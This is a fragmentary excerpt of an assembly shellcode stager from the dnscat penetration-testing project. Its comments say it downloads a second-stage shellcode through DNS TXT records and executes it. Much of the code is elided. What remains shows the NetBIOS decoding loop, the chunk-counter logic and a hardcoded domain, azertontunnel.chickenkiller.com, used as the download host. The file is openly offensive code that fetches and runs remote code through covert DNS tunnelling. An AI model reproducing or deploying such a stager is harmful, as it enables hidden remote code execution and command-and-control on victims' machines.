; dnscat-shell.asm
; By Ron Bowes, extended by Daan Raman
; Created March, 2010
;
; (See LICENSE.txt)
;
; This shellcode will download a shellcode stage over DNS (through TXT records)
; and run it. Being a stager, it is designed to be as small as possible, 
...
mov ebx, 0x100000 ;make room for 1mb of stage code
...
get_domain_top:
 ...
 ;Decode NetBIOS encoded result
 ;At this point, esi contains the NetBIOS encoded string. We should decode as following:
 ;pop character off string,  subtract 0x41 (first nibble)
 ;pop character off string, subtract 0x41 (second nibble)
 ;shift first nibble by 4 and OR it with the second nibble
 ...
 ;add cl, 16 ; This has to the STAGE_CHUNK_SIZE constant on dnscat
 ;rep movsb

 pop esi ; Restore
 ; This block increments the two-byte subdomain to choose which block
 ; we want to receive. Note that after '999' blocks, the behaviour will
 ; break (so 999 * CHUNK_SIZE is the longest possible stage). 
 inc ebx
 inc ebx
 ...
 jle ok
 mov byte [ebx-1], '0'
 inc byte [ebx-2] ; increment third digit
ok:
jmp main_top
...
call get_domain_top
 db '000.'
 db 'azertontunnel.chickenkiller.com',0 ; REPLACETEST
